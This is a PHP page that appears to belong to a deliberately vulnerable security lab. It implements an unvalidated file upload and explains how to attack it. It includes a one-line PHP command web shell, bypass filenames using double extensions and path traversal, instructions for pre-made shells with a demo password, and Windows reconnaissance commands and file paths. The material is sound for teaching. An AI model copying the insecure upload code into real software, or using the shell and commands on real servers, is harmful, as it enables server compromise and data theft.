<?php
session_start();

// Create uploads directory if it doesn't exist
$uploadDirectory = "uploads/";
if (!file_exists($uploadDirectory)) {
    mkdir($uploadDirectory, 0777, true);
}

$message = '';
$messageType = '';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["file"])) {
    $file = $_FILES["file"];
    $fileName = $file["name"]; // Vulnerable: Using original filename without sanitization
    $targetFile = $uploadDirectory . $fileName;
    
    // Vulnerable: No file type checking
    // Vulnerable: No file size limits
    // Vulnerable: No extension validation
    if (move_uploaded_file($file["tmp_name"], $targetFile)) {
        $message = "File uploaded successfully to: " . htmlspecialchars($targetFile);
        $messageType = "success";
    } else {
        $message = "Error uploading file.";
        $messageType = "danger";
    }
}

// List uploaded files
function listUploadedFiles($dir) {
    $files = [];
    if (is_dir($dir)) {
        $files = array_diff(scandir($dir), array('.', '..'));
    }
    return $files;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerable File Upload Example</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container py-5">
        <h1 class="mb-4">Vulnerable File Upload Example</h1>
        <div class="alert alert-danger">
            <strong>Warning:</strong> This page is intentionally vulnerable to file upload attacks!
        </div>

        <div class="row">
            <div class="col-md-6">
                <div class="card mb-4">
                    <div class="card-body">
                        <h5 class="card-title">Upload File</h5>
                        <?php if ($message): ?>
                            <div class="alert alert-<?php echo $messageType; ?>">
                                <?php echo $message; ?>
                            </div>
                        <?php endif; ?>

                        <form method="POST" enctype="multipart/form-data">
                            <div class="mb-3">
                                <label for="file" class="form-label">Choose File:</label>
                                <input type="file" class="form-control" id="file" name="file" required>
                                <small class="text-muted">Try uploading: shell.php, test.php.jpg, large_file.zip</small>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload</button>
                        </form>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Uploaded Files</h5>
                        <?php
                        $uploadedFiles = listUploadedFiles($uploadDirectory);
                        if (count($uploadedFiles) > 0): ?>
                            <ul class="list-group">
                            <?php foreach($uploadedFiles as $file): ?>
                                <li class="list-group-item">
                                    <a href="<?php echo $uploadDirectory . htmlspecialchars($file); ?>" target="_blank">
                                        <?php echo htmlspecialchars($file); ?>
                                    </a>
                                </li>
                            <?php endforeach; ?>
                            </ul>
                        <?php else: ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">How to Test This Vulnerability</h5>
                        <p>This file upload system is vulnerable to several attacks. Try these tests:</p>
                        
                        <h6 class="mt-3">1. PHP Shell Upload</h6>
                        <pre class="bg-light p-2 mb-3">&lt;?php
system($_GET['cmd']);
?&gt;</pre>
                        <p class="small">Save as shell.php and upload. Then access it with ?cmd=dir to execute commands.</p>

                        <h6>2. Double Extension</h6>
                        <p class="small">Save a PHP file as image.jpg.php to bypass basic checks.</p>

                        <h6>3. Large File Upload</h6>
                        <p class="small">Try uploading a very large file (>100MB) to test for DoS.</p>

                        <h6>4. Malicious MIME Type</h6>
                        <p class="small">Upload a PHP file but modify its MIME type to image/jpeg.</p>

                        <h6>5. Special Characters</h6>
                        <p class="small">Use filenames with special characters like "../../shell.php".</p>

                        <div class="alert alert-info mt-3">
                            <h6 class="mb-0">Vulnerabilities Present:</h6>
                            <ul class="mb-0 small">
                                <li>No file type validation</li>
                                <li>No file size limits</li>
                                <li>No extension checking</li>
                                <li>No MIME type validation</li>
                                <li>Original filenames preserved</li>
                                <li>Files stored in web-accessible directory</li>
                                <li>Executable files allowed</li>
                            </ul>
                        </div>

                        <div class="card mt-3">
                            <div class="card-body">
                                <h5 class="card-title">Pre-made Malicious Files for Testing</h5>
                                <p>Two example malicious files have been provided to demonstrate the risks:</p>

                                <h6 class="mt-3">1. System Information Gatherer (sysinfo.php)</h6>
                                <ul class="small mb-3">
                                    <li><strong>Purpose:</strong> Gathers sensitive server information</li>
                                    <li><strong>How to access:</strong> 
                                        <a href="uploads/sysinfo.php?pass=demo123" target="_blank">Click here</a> 
                                        or visit <code>uploads/sysinfo.php?pass=demo123</code>
                                    </li>
                                    <li><strong>Available actions:</strong>
                                        <ul>
                                            <li><a href="uploads/sysinfo.php?pass=demo123&action=info" target="_blank">View System Info</a> - Shows PHP configuration and server details</li>
                                            <li><a href="uploads/sysinfo.php?pass=demo123&action=files" target="_blank">List Files</a> - Shows directory contents</li>
                                            <li><a href="uploads/sysinfo.php?pass=demo123&action=phpinfo" target="_blank">PHP Info</a> - Displays full PHP configuration</li>
                                        </ul>
                                    </li>
                                </ul>

                                <h6>2. File Manager Shell (filemanager.php)</h6>
                                <ul class="small mb-3">
                                    <li><strong>Purpose:</strong> Provides complete file system access and command execution</li>
                                    <li><strong>How to access:</strong> 
                                        <a href="uploads/filemanager.php" target="_blank">Click here</a> 
                                        or visit <code>uploads/filemanager.php</code>
                                    </li>
                                    <li><strong>Login password:</strong> <code>demo123</code></li>
                                    <li><strong>Features and Examples:</strong>
                                        <div class="mt-2">
                                            <strong>1. Command Execution:</strong>
                                            <pre class="bg-light p-2 mb-2">Try these commands:
dir                     # List directory contents
whoami                 # Show current user
systeminfo            # Display system information
netstat -an           # Show network connections
tasklist              # List running processes</pre>
                                            
                                            <strong>2. File Browser:</strong>
                                            <pre class="bg-light p-2 mb-2">Try these paths:
.                      # Current directory
..                    # Parent directory
C:\xampp\htdocs       # Web root
C:\Windows\System32   # System directory</pre>
                                            
                                            <strong>3. File Upload:</strong>
                                            <ul>
                                                <li>Upload any file using the file upload form</li>
                                                <li>Files are stored in the current directory</li>
                                                <li>No restrictions on file types or sizes</li>
                                            </ul>
                                            
                                            <strong>4. File Reader:</strong>
                                            <pre class="bg-light p-2 mb-2">Try reading these files:
../config/database.php    # Database configuration
../../index.php          # Main index file
C:\Windows\win.ini       # System configuration</pre>
                                        </div>
                                    </li>
                                    <li><strong>Advanced Usage:</strong>
                                        <pre class="bg-light p-2 mb-2">Example Commands:
# Network Information
ipconfig /all

# User Information
net user

# Find specific files
dir *.php /s

# View environment variables
set

# Check running services
net start

# Access Control Lists
cacls .</pre>
                                    </li>
                                </ul>

                                <div class="alert alert-danger">
                                    <strong>⚠️ Security Impact:</strong>
                                    <p class="small mb-0">This file manager shell demonstrates several critical security risks:</p>
                                    <ul class="small mb-0">
                                        <li>Unrestricted command execution</li>
                                        <li>Access to sensitive system files</li>
                                        <li>Ability to modify/delete files</li>
                                        <li>Network information exposure</li>
                                        <li>System configuration access</li>
                                        <li>Unrestricted file upload capabilities</li>
                                    </ul>
                                </div>

                                <div class="alert alert-warning mb-0 mt-3">
                                    <strong>⚠️ Educational Purpose Only:</strong> These examples demonstrate why proper file upload validation is critical. In a real application, such files could lead to complete server compromise.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="mt-4">
            <a href="../../index.php" class="btn btn-secondary">Back to Index</a>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
